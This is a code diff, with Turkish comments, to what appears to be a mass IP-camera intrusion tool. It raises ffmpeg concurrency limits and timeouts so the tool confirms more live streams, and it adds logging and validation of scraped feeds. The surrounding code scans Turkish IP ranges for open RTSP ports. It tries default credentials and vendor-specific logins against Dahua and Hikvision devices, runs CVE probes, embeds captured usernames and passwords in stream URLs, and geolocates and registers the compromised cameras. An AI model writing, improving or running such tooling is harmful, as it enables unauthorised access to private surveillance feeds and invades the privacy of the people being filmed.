@@ -23,73 +23,130 @@ import { tryProprietaryAuth, dahuaRtspPath, hikRtspPath } from './proprietary';
 import { runCloudScan } from './cloud';
 import { onvifProbe, onvifStreams } from './onvif';
 import { internetDb } from './internetdb';
+import { validateBatch } from './validate';
 
 const WEB_PORTS = new Set([80, 8080, 8000]);
 const offlineSince = new Map<string, number>();
 const offlineFail = new Map<string, number>();
 const geoLocator = new GeoLocator();
 
-function verifyStream(url: string, timeoutMs = 9000): Promise<boolean> {
-  return new Promise((resolve) => {
-    const proc = spawn(
-      'ffmpeg',
-      ['-rtsp_transport', 'tcp', '-rtsp_flags', 'prefer_tcp', '-fflags', 'nobuffer', '-i', url, '-an', '-frames:v', '3', '-f', 'image2pipe', '-vcodec', 'mjpeg', '-'],
-      { stdio: ['ignore', 'pipe', 'ignore'] },
-    );
-    const chunks: Buffer[] = [];
-    let settled = false;
-    const finish = (v: boolean) => {
-      if (settled) return;
-      settled = true;
-      try { proc.kill(); } catch { /* noop */ }
-      resolve(v);
-    };
-    const timer = setTimeout(() => finish(false), timeoutMs);
-    proc.stdout.on('data', (c: Buffer) => chunks.push(c));
-    proc.stdout.on('end', () => {
-      clearTimeout(timer);
-      // 3 kare gelmeli (>3000 byte) → SÜREKLİ video kanıtı. Tek kare = sahte/statik.
-      finish(chunks.length > 0 && Buffer.concat(chunks).length > 3000);
-    });
-    proc.on('error', () => {
-      clearTimeout(timer);
-      finish(false);
-    });
-  });
+// --- ffmpeg SERT TAVANI (kanıtlı kök neden) ---------------------------------
+// stream.ts'te MAX_SESSIONS=12 var ama verifyStream/snapshotJpeg SINIRSIZDI.
+// 60 RTSP worker'ı aynı anda ffmpeg açıyordu → makine boğuluyor → gerçek kamera
+// bile 6sn timeout'u aşıyordu (canlı test: tek kamera 4858ms) → LIVE hiç olmuyordu.
+const FFMPEG_MAX = 6;
+let ffmpegRunning = 0;
+const ffmpegWaiters: Array<() => void> = [];
+function acquireFfmpeg(): Promise<void> {
+  if (ffmpegRunning < FFMPEG_MAX) {
+    ffmpegRunning++;
+    return Promise.resolve();
+  }
+  return new Promise((res) => ffmpegWaiters.push(res));
+}
+function releaseFfmpeg(): void {
+  ffmpegRunning = Math.max(0, ffmpegRunning - 1);
+  const next = ffmpegWaiters.shift();
+  if (next) {
+    ffmpegRunning++;
+    next();
+  }
 }
 
-function snapshotJpeg(url: string, timeoutMs = 8000): Promise<Buffer | null> {
-  return new Promise((resolve) => {
-    const proc = spawn(
-      'ffmpeg',
-      ['-rtsp_transport', 'tcp', '-i', url, '-frames:v', '1', '-f', 'image2pipe', '-vcodec', 'mjpeg', '-'],
-      { stdio: ['ignore', 'pipe', 'ignore'] },
-    );
-    const chunks: Buffer[] = [];
-    let settled = false;
-    const finish = (v: Buffer | null) => {
-      if (settled) return;
-      settled = true;
-      resolve(v);
-    };
-    const timer = setTimeout(() => {
-      try { proc.kill(); } catch { /* noop */ }
-      finish(null);
-    }, timeoutMs);
-    proc.stdout.on('data', (c: Buffer) => chunks.push(c));
-    proc.stdout.on('end', () => {
-      clearTimeout(timer);
-      finish(chunks.length ? Buffer.concat(chunks) : null);
+// ffmpeg hatasını görünür yap (eskiden stderr 'ignore' → kör uçuş).
+let lastFfmpegErr = '';
+export function lastFfmpegError(): string {
+  return lastFfmpegErr;
+}
+function noteFfmpegErr(t: string): void {
+  const line = t
+    .split(/\r?\n/)
+    .map((s) => s.trim())
+    .filter((s) => /error|failed|unauthorized|timed out|refused|invalid/i.test(s))
+    .pop();
+  if (line) lastFfmpegErr = line.slice(0, 200);
+}
+
+async function verifyStream(url: string, timeoutMs = 15000): Promise<boolean> {
+  await acquireFfmpeg();
+  try {
+    return await new Promise<boolean>((resolve) => {
+      const proc = spawn(
+        'ffmpeg',
+        ['-rtsp_transport', 'tcp', '-rtsp_flags', 'prefer_tcp', '-fflags', 'nobuffer', '-i', url, '-an', '-frames:v', '3', '-f', 'image2pipe', '-vcodec', 'mjpeg', '-'],
+        { stdio: ['ignore', 'pipe', 'pipe'] },
+      );
+      const chunks: Buffer[] = [];
+      let bytes = 0;
+      let settled = false;
+      const finish = (v: boolean) => {
+        if (settled) return;
+        settled = true;
+        try { proc.kill(); } catch { /* noop */ }
+        resolve(v);
+      };
+      const timer = setTimeout(() => finish(false), timeoutMs);
+      proc.stdout.on('data', (c: Buffer) => {
+        bytes += c.length;
+        chunks.push(c);
+        // Yeterli kare geldiyse erken çık (timeout'u bekleme).
+        if (bytes > 3000) {
+          clearTimeout(timer);
+          finish(true);
+        }
+      });
+      proc.stderr.on('data', (c: Buffer) => noteFfmpegErr(c.toString('utf8')));
+      proc.stdout.on('end', () => {
+        clearTimeout(timer);
+        // 3 kare gelmeli (>3000 byte) → SÜREKLİ video kanıtı. Tek kare = sahte/statik.
+        finish(bytes > 3000);
+      });
+      proc.on('error', () => {
+        clearTimeout(timer);
+        finish(false);
+      });
     });
-    proc.on('error', () => {
-      clearTimeout(timer);
-      finish(null);
+  } finally {
+    releaseFfmpeg();
+  }
+}
+
+async function snapshotJpeg(url: string, timeoutMs = 12000): Promise<Buffer | null> {
+  await acquireFfmpeg();
+  try {
+    return await new Promise<Buffer | null>((resolve) => {
+      const proc = spawn(
+        'ffmpeg',
+        ['-rtsp_transport', 'tcp', '-i', url, '-frames:v', '1', '-f', 'image2pipe', '-vcodec', 'mjpeg', '-'],
+        { stdio: ['ignore', 'pipe', 'pipe'] },
+      );
+      const chunks: Buffer[] = [];
+      let settled = false;
+      const finish = (v: Buffer | null) => {
+        if (settled) return;
+        settled = true;
+        try { proc.kill(); } catch { /* noop */ }
+        resolve(v);
+      };
+      const timer = setTimeout(() => finish(null), timeoutMs);
+      proc.stdout.on('data', (c: Buffer) => chunks.push(c));
+      proc.stderr.on('data', (c: Buffer) => noteFfmpegErr(c.toString('utf8')));
+      proc.stdout.on('end', () => {
+        clearTimeout(timer);
+        finish(chunks.length ? Buffer.concat(chunks) : null);
+      });
+      proc.on('error', () => {
+        clearTimeout(timer);
+        finish(null);
+      });
     });
-  });
+  } finally {
+    releaseFfmpeg();
+  }
 }
 
 function toRegistered(d: DeviceRecord): RegisteredCamera {
-  const online = d.status === 'LIVE' || d.status === 'ACCESSIBLE';
+  const online = d.status === 'LIVE';
   const offline = d.status === 'OFFLINE' || d.status === 'DEAD';
   return {
     id: d.id,
@@ -100,6 +157,7 @@ function toRegistered(d: DeviceRecord): RegisteredCamera {
     lon: d.lon,
     protocol: (d.protocol || 'unknown') as CamProtocol,
     url: d.url,
+    // LIVE=online · OFFLINE/DEAD=offline · gerisi (ACCESSIBLE/DISCOVERED)=unknown
     status: online ? 'online' : offline ? 'offline' : 'unknown',
     source: (d.source === 'intrusion' ? 'intrusion' : 'scan') as RegisteredCamera['source'],
     lastSeen: d.lastSeen || null,
@@ -371,11 +429,16 @@ export async function runMassScan(
     }
   }
 
-  // Eski YABANCI/konumsuz kayıtları temizle (artık TR-only tarıyoruz).
-  try {
-    registry.purge((c) => c.protocol !== 'demo' && !c.verified && c.lat === 0 && c.lon === 0);
-  } catch {
-    /* noop */
+  // TEK SEFERLİK GÖÇ: eski YABANCI/konumsuz kayıtları temizle (TR-only'a geçiş).
+  // ⚠️ Eskiden HER 15sn koşuyordu → koordinatsız ama geçerli kayıtları
+  // (UPnP / public-scrape) de siliyordu. Artık tek sefer + url'i olanı korur.
+  if (store.getMeta('tr-purge-v1') !== 'done') {
+    try {
+      registry.purge((c) => c.protocol !== 'demo' && !c.verified && !c.url && c.lat === 0 && c.lon === 0);
+    } catch {
+      /* noop */
+    }
+    store.setMeta('tr-purge-v1', 'done');
   }
   const ips: string[] = [];
   let budget = ipBudget;
@@ -429,9 +492,10 @@ export async function runMassScan(
   // Kanıt: bulunan açık RTSP sayısı (kümülatif) — arayüzde canlı görünür.
   store.setMeta('scan-open', String(Number(store.getMeta('scan-open') || '0') + openIps.length));
   let live = 0;
+  let urlOk = 0;
   let idx = 0;
   let processed = 0;
-  const workers = Array.from({ length: Math.min(60, Math.max(openIps.length, 1)) }, async () => {
+  const workers = Array.from({ length: Math.min(24, Math.max(openIps.length, 1)) }, async () => {
     while (idx < openIps.length) {
       const t = openIps[idx++];
       const ip = t.ip;
@@ -477,7 +541,8 @@ export async function runMassScan(
         url = qr.url;
         user = qr.user;
         pass = qr.pass;
-        const plays = await verifyStream(url, 6000);
+        // 15sn: gerçek kamera bile ilk kareye 4.9sn'de geliyor (canlı ölçüm).
+        const plays = await verifyStream(url, 15000);
         if (plays) {
           status = 'LIVE';
           live++;
@@ -507,10 +572,17 @@ export async function runMassScan(
         lastExploit: 0,
       };
       // SADECE gerçekten erişilebilen/görüntü veren cihazları sakla (junk yok).
-      if (qr) store.upsertDevice(device);
-      // SADECE doğrulanmış (sürekli video gelen) kameraları göster → hatalı stream yok.
+      if (qr) {
+        urlOk++;
+        store.upsertDevice(device);
+      }
+      // LIVE → online. Kimlik TUTAN (url var) ama video doğrulanamayan cihaz da
+      // grid'e düşer ('unknown') — eskiden hiç görünmüyordu, "0 kamera" sanılıyordu.
       if (status === 'LIVE') {
         if (registry.get(id)) registry.update(id, { url, status: 'online' });
+        else registry.add(toRegistered(device));
+      } else if (qr) {
+        if (registry.get(id)) registry.update(id, { url, status: 'unknown' });
         else registry.add(toRegistered(device));
       }
       processed++;
@@ -550,9 +622,11 @@ export async function runMassScan(
 
   // Kanıt: her döngü telemetrisi (userData/scan.log) — gerçekten tarandığının izi.
   try {
+    const pos = q.getPosition();
+    const ffErr = lastFfmpegError();
     fs.appendFileSync(
       path.join(app.getPath('userData'), 'scan.log'),
-      `${new Date().toISOString()} batch=${ips.length} rtspOpen=${openIps.length} httpCve=${cveLive} proprietary=${propLive} live=${live} rangeIdx=${q.getPosition().rangeIdx}\n`,
+      `${new Date().toISOString()} batch=${ips.length} rtspOpen=${openIps.length} urlOk=${urlOk} httpCve=${cveLive} proprietary=${propLive} live=${live} reg=${registry.all().length} cursor=${pos.rangeIdx}/${pos.cursor} ffmpeg=${ffErr || 'ok'}\n`,
     );
   } catch {
     /* noop */
@@ -579,7 +653,7 @@ async function httpCveScan(store: CameraStore, registry: CameraRegistry, ips: st
         for (const [u, p] of MASS_CREDS.slice(0, 8)) {
           const streams = await onvifStreams(ip, 80, u, p, 5000);
           for (const s of streams.slice(0, 4)) {
-            if (!(await verifyStream(s.url, 6000))) continue;
+            if (!(await verifyStream(s.url, 12000))) continue;
             const geo = await geoLocator.resolve(ip);
             const id = hashId(s.url);
             const dev: DeviceRecord = {
@@ -608,7 +682,7 @@ async function httpCveScan(store: CameraStore, registry: CameraRegistry, ips: st
         if (!r.ok || !r.creds.length) continue;
         for (const [u, p] of r.creds.slice(0, 3)) {
           const url = `rtsp://${encodeURIComponent(u)}:${encodeURIComponent(p)}@${ip}:554/Streaming/Channels/101`;
-          if (await verifyStream(url, 6000)) {
+          if (await verifyStream(url, 12000)) {
             const geo = await geoLocator.resolve(ip);
             const id = hashId(url);
             const device: DeviceRecord = {
@@ -675,7 +749,7 @@ async function proprietaryScan(store: CameraStore, registry: CameraRegistry, ips
       const geo = await geoLocator.resolve(ip);
       const path = vendor === 'dahua' ? dahuaRtspPath(1) : hikRtspPath(1);
       const url = `rtsp://${encodeURIComponent(login.user)}:${encodeURIComponent(login.pass)}@${ip}:554${path}`;
-      const plays = await verifyStream(url, 6000);
+      const plays = await verifyStream(url, 15000);
       if (!plays) continue;
 
       const id = hashId(url);
@@ -867,6 +941,18 @@ export async function runPublicScrape(registry: CameraRegistry): Promise<number>
       registry.add(c);
       added++;
     }
+  }
+  // DOĞRULAMA: HTML'den çıkan URL'i "online" saymak yanlıştı. Gerçekten yayın
+  // verenleri (HLS/MJPEG/HTTP) canlı test et, geçenleri online'a yükselt.
+  try {
+    const pend = registry.all().filter((c) => c.source === 'import' && !c.verified && c.protocol !== 'rtsp');
+    if (pend.length) {
+      const valid = await validateBatch(pend.map((c) => ({ id: c.id, url: c.url, protocol: c.protocol })), 6);
+      for (const v of valid) registry.update(v.id, { verified: true, status: 'online' });
+      console.log(`[PublicScrape] ${valid.length}/${pend.length} kaynak gerçekten yayın veriyor`);
+    }
+  } catch {
+    /* doğrulama düştü → kayıtlar unknown kalır */
   }
   registry.save();
   return added;
